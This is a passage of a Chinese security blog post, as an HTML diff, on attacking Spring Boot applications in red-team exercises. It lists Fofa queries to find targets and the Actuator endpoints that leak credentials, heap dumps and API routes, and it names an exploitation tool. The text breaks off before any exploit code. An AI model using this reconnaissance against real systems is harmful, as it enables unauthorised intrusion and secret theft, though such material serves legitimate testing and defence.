@@ -1,0 +1,1314 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="攻防中SpringBoot快速打点">
+<title>SpringBoot框架打点</title>
+
+<link rel='canonical' href='https://lserein.github.io/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/'>
+
+<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="SpringBoot框架打点">
+<meta property='og:description' content="攻防中SpringBoot快速打点">
+<meta property='og:url' content='https://lserein.github.io/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/'>
+<meta property='og:site_name' content='Lsec&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-11-02T19:18:50&#43;08:00'/><meta property='article:modified_time' content='2025-11-02T19:44:35&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/logo.png' />
+<meta name="twitter:title" content="SpringBoot框架打点">
+<meta name="twitter:description" content="攻防中SpringBoot快速打点"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://lserein.github.io/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/logo.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_5a2f261f7f9cea8c.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Lsec&#39;s Blog</a></h1>
+            <h2 class="site-description">欢迎来到Lsec的博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Lserein/Lserein.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://x.com/secL15737016'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#1actuator-端点能干什么">1.Actuator 端点能干什么</a>
+      <ol>
+        <li><a href="#低风险类">低风险类</a></li>
+        <li><a href="#"><strong>中高风险（敏感信息泄露）</strong></a>
+          <ol>
+            <li><a href="#actuatormappings泄露后端接口信息"><code>/actuator/mappings</code>—泄露后端接口信息</a></li>
+            <li><a href="#actuatorenv"><code>/actuator/env</code>—<strong>所有环境变量和配置属性</strong></a></li>
+            <li><a href="#actuatorloggers查看日志级别">/actuator/loggers—查看日志级别</a></li>
+            <li><a href="#actuatorheapdump实战中最常用">/actuator/heapdump—实战中最常用</a></li>
+            <li><a href="#actuatormetrics">/actuator/metrics</a></li>
+            <li><a href="#actuatorconfigprops泄露所有configurationproperties配置">/actuator/configprops—泄露所有<code>@ConfigurationProperties</code>配置</a></li>
+            <li><a href="#swagger未授权访问泄露所有后端接口和参数">/swagger未授权访问&mdash;泄露所有后端接口和参数</a></li>
+          </ol>
+        </li>
+        <li><a href="#3">3. <strong>高风险（可操作/执行类）</strong></a></li>
+      </ol>
+    </li>
+    <li><a href="#"><strong>2.Spring Boot常见漏洞</strong></a>
+      <ol>
+        <li><a href="#21spring-cloud-gateway-rce漏洞">2.1.Spring Cloud Gateway RCE漏洞</a></li>
+        <li><a href="#22spring框架目录遍历漏洞cve-2024-38816">2.2.Spring框架目录遍历漏洞CVE-2024-38816</a></li>
+        <li><a href="#23任意文件读取">2.3.任意文件读取</a></li>
+        <li><a href="#24spring-cloud-function-functionrouter-spel代码执行漏洞">2.4.Spring Cloud Function functionRouter SPEL代码执行漏洞</a></li>
+      </ol>
+    </li>
+    <li><a href="#3springboot常见绕过">3.SpringBoot常见绕过</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/">
+                <img src="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/logo_hu_c52e2a204381b759.png"
+                        srcset="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/logo_hu_c52e2a204381b759.png 800w, /p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/logo_hu_64ff303fc51637c6.png 1600w"
+                        width="800" 
+                        height="365" 
+                        loading="lazy"
+                        alt="Featured image of post SpringBoot框架打点" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                Web安全
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/">SpringBoot框架打点</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            攻防中SpringBoot快速打点
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Nov 02, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 5 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>参考链接：</p>
+<p><a class="link" href="https://blog.zgsec.cn/archives/129.html"  target="_blank" rel="noopener"
+    >https://blog.zgsec.cn/archives/129.html</a></p>
+<p><a class="link" href="https://forum.butian.net/share/1935"  target="_blank" rel="noopener"
+    >https://forum.butian.net/share/1935</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/S1BLrSmjME1duMhDD1uKKA"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/S1BLrSmjME1duMhDD1uKKA</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Fofa</span><span class="err">：</span><span class="n">icon_hash</span><span class="o">=</span><span class="s">&#34;116323821&#34;</span><span class="w">      </span><span class="n">通过图标寻找不太准确</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Fofa</span><span class="err">：</span><span class="n">body</span><span class="o">=</span><span class="s">&#34;Whitelabel Error Page&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="1actuator-端点能干什么">1.<font style="color:rgb(17, 17, 51);">Actuator 端点能干什么</font>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">常见端点及其作用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">路径</span><span class="w">	</span><span class="n">是否默认启用</span><span class="w">	</span><span class="n">功能描述</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">auditevents</span><span class="w">	</span><span class="n">是</span><span class="w">	</span><span class="n">显示当前应用程序的审计事件信息</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">beans</span><span class="w">	</span><span class="n">是</span><span class="w">	</span><span class="n">显示一个应用中所有Spring</span><span class="w"> </span><span class="n">Beans的完整列表</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">conditions</span><span class="w">	</span><span class="n">是</span><span class="w">	</span><span class="n">显示配置类和自动配置类的状态及它们被应用或未被应用的原因</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">configprops</span><span class="w">	</span><span class="n">是</span><span class="w">	</span><span class="n">显示一个所有</span><span class="nd">@ConfigurationProperties的集合列表</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">env</span><span class="w">	</span><span class="n">是</span><span class="w">	</span><span class="n">显示来自Spring的</span><span class="w"> </span><span class="n">ConfigurableEnvironment的属性</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">flyway</span><span class="w">	</span><span class="n">是</span><span class="w">	</span><span class="n">显示数据库迁移路径</span><span class="err">（</span><span class="n">如果存在</span><span class="err">）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">health</span><span class="w">	</span><span class="n">是</span><span class="w">	</span><span class="n">显示应用的健康信息</span><span class="err">（</span><span class="n">当使用一个未认证连接访问时显示一个简单的</span><span class="err">’</span><span class="n">status</span><span class="err">’，</span><span class="n">使用认证连接访问则显示全部信息详情</span><span class="err">）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">info</span><span class="w">	</span><span class="n">是</span><span class="w">	</span><span class="n">显示任意的应用信息</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">liquibase</span><span class="w">	</span><span class="n">是</span><span class="w">	</span><span class="n">展示任何Liquibase数据库迁移路径</span><span class="err">（</span><span class="n">如果存在</span><span class="err">）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">metrics</span><span class="w">	</span><span class="n">是</span><span class="w">	</span><span class="n">展示当前应用的metrics信息</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">mappings</span><span class="w">	</span><span class="n">是</span><span class="w">	</span><span class="n">显示一个所有</span><span class="nd">@RequestMapping路径的集合列表</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">scheduledtasks</span><span class="w">	</span><span class="n">是</span><span class="w">	</span><span class="n">显示应用程序中的计划任务</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">sessions</span><span class="w">	</span><span class="n">否</span><span class="w">	</span><span class="n">允许从Spring会话支持的会话存储中检索和删除用户会话</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">shutdown</span><span class="w">	</span><span class="n">否</span><span class="w">	</span><span class="n">允许应用以优雅的方式关闭</span><span class="err">（</span><span class="n">默认情况下不启用</span><span class="err">）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">threaddump</span><span class="w">	</span><span class="n">是</span><span class="w">	</span><span class="n">执行一个线程dump</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">heapdump</span><span class="w">	</span><span class="n">是</span><span class="w">	</span><span class="n">返回一个GZip压缩的hprof堆dump文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">jolokia</span><span class="w">	</span><span class="n">是</span><span class="w">	</span><span class="n">通过HTTP暴露JMX</span><span class="w"> </span><span class="n">beans</span><span class="err">（</span><span class="n">当Jolokia在类路径上时</span><span class="err">，</span><span class="n">WebFlux不可用</span><span class="err">）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">logfile</span><span class="w">	</span><span class="n">是</span><span class="w">	</span><span class="n">返回日志文件内容</span><span class="err">（</span><span class="n">如果设置了logging</span><span class="p">.</span><span class="na">file或logging</span><span class="p">.</span><span class="na">path属性的话</span><span class="err">），</span><span class="n">支持使用HTTP</span><span class="w"> </span><span class="n">Range头接收日志文件内容的部分信息</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">prometheus</span><span class="w">	</span><span class="n">是</span><span class="w">	</span><span class="n">以可以被Prometheus服务器抓取的格式显示metrics信息</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="低风险类">低风险类
+</h3><div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>/actuator/health</th>
+          <th><font style="color:rgb(17, 17, 51);">应用健康状态（是否存活）</font></th>
+          <th><font style="color:rgb(17, 17, 51);">低，但可判断服务是否在线</font></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>/actuator/info</strong></td>
+          <td><font style="color:rgb(17, 17, 51);">自定义信息（如 Git 版本、构建时间）</font></td>
+          <td><font style="color:rgb(17, 17, 51);">可能泄露版本号、分支名</font></td>
+      </tr>
+  </tbody>
+</table></div>
+<p><img src="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/1.png"
+	width="1008"
+	height="258"
+	srcset="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/1_hu_d10f16f7c273df24.png 480w, /p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/1_hu_6695bacff5578e7.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="390"
+		data-flex-basis="937px"
+	
+></p>
+<h3 id=""><strong><font style="color:rgb(17, 17, 51);">中高风险（敏感信息泄露）</font></strong>
+</h3><div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>/actuator/env</th>
+          <th><strong><font style="color:rgb(17, 17, 51);">所有环境变量和配置属性</font></strong><font style="color:rgb(17, 17, 51);">（含数据库密码、密钥、Redis 地址等）</font></th>
+          <th><font style="color:rgb(17, 17, 51);">⚠️</font><font style="color:rgb(17, 17, 51);"> </font><strong><font style="color:rgb(17, 17, 51);">极高</font></strong><font style="color:rgb(17, 17, 51);">！常含</font><font style="color:rgb(17, 17, 51);"> </font><code>spring.datasource.password</code><br/><font style="color:rgb(17, 17, 51);">、</font>aliyun.accesskey<font style="color:rgb(17, 17, 51);"> </font><font style="color:rgb(17, 17, 51);">等</font></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>/actuator/configprops</code></td>
+          <td><font style="color:rgb(17, 17, 51);">所有</font><font style="color:rgb(17, 17, 51);"> </font><code>@ConfigurationProperties</code><br/><font style="color:rgb(17, 17, 51);"> </font><font style="color:rgb(17, 17, 51);">配置</font></td>
+          <td><font style="color:rgb(17, 17, 51);">可能泄露中间件配置</font></td>
+      </tr>
+      <tr>
+          <td><code>/actuator/beans</code></td>
+          <td><font style="color:rgb(17, 17, 51);">所有 Spring Bean 及其依赖关系</font></td>
+          <td><font style="color:rgb(17, 17, 51);">可分析应用结构、识别漏洞组件</font></td>
+      </tr>
+      <tr>
+          <td><code>/actuator/mappings</code></td>
+          <td><font style="color:rgb(17, 17, 51);">所有 URL 路由映射（Controller 接口）</font></td>
+          <td><strong><font style="color:rgb(17, 17, 51);">暴露未公开 API</font></strong><font style="color:rgb(17, 17, 51);">，如</font><font style="color:rgb(17, 17, 51);"> </font><code>/admin/deleteUser</code></td>
+      </tr>
+      <tr>
+          <td><code>/actuator/threaddump</code></td>
+          <td><font style="color:rgb(17, 17, 51);">线程堆栈信息</font></td>
+          <td><font style="color:rgb(17, 17, 51);">可分析死锁、业务逻辑</font></td>
+      </tr>
+      <tr>
+          <td><code>/actuator/heapdump</code></td>
+          <td><font style="color:rgb(17, 17, 51);">生成 JVM 堆内存快照（</font><code>.hprof</code><br/><font style="color:rgb(17, 17, 51);"> </font><font style="color:rgb(17, 17, 51);">文件）</font></td>
+          <td><strong><font style="color:rgb(17, 17, 51);">可离线分析内存中的密码、密钥、用户数据</font></strong></td>
+      </tr>
+      <tr>
+          <td><code>/actuator/loggers</code></td>
+          <td><font style="color:rgb(17, 17, 51);">查看/修改日志级别</font></td>
+          <td><font style="color:rgb(17, 17, 51);">可开启 debug 日志泄露更多信息</font></td>
+      </tr>
+  </tbody>
+</table></div>
+<h4 id="actuatormappings泄露后端接口信息"><code>/actuator/mappings</code>&mdash;泄露后端接口信息
+</h4><p><img src="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/2.png"
+	width="2560"
+	height="1046"
+	srcset="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/2_hu_f963b74bfa9e8c0b.png 480w, /p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/2_hu_19cb98bfc68559d1.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="244"
+		data-flex-basis="587px"
+	
+></p>
+<h4 id="actuatorenv"><code>/actuator/env</code>&mdash;<strong><font style="color:rgb(17, 17, 51);">所有环境变量和配置属性</font></strong>
+</h4><p><img src="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/3.png"
+	width="1919"
+	height="1116"
+	srcset="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/3_hu_c4eac0dc5c070df0.png 480w, /p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/3_hu_77218234c42ff7f2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="171"
+		data-flex-basis="412px"
+	
+></p>
+<p>大部分情况下是不可读的，如何读取呢？</p>
+<p>项目地址：https://github.com/wh1t3zer/SpringBootVul-GUI</p>
+<p>参考链接：<a class="link" href="https://mp.weixin.qq.com/s/LWJniWUIOvbWLQv9SmRv5A"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/LWJniWUIOvbWLQv9SmRv5A</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/JwAG7j6-YFKO1GYtWNp7sQ"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/JwAG7j6-YFKO1GYtWNp7sQ</a></p>
+<p><img src="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/4.png"
+	width="1203"
+	height="931"
+	srcset="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/4_hu_c3c74890742c766c.png 480w, /p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/4_hu_fd62af2e64b66da1.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="129"
+		data-flex-basis="310px"
+	
+></p>
+<h4 id="actuatorloggers查看日志级别"><font style="color:rgb(17, 17, 51);background-color:rgba(175, 184, 193, 0.2);">/actuator/loggers&mdash;查看日志级别</font>
+</h4><p><img src="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/5.png"
+	width="2544"
+	height="1044"
+	srcset="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/5_hu_ac7c9b8c593a7137.png 480w, /p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/5_hu_88929b8a49737fb4.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="243"
+		data-flex-basis="584px"
+	
+></p>
+<p><img src="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/6.png"
+	width="2560"
+	height="845"
+	srcset="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/6_hu_1b211a3168cc8793.png 480w, /p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/6_hu_889188cba43b902c.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="302"
+		data-flex-basis="727px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="w"> </span><span class="n">甚至能未授权修改为</span><span class="w"> </span><span class="n">日志级别DEBUG</span><span class="w">
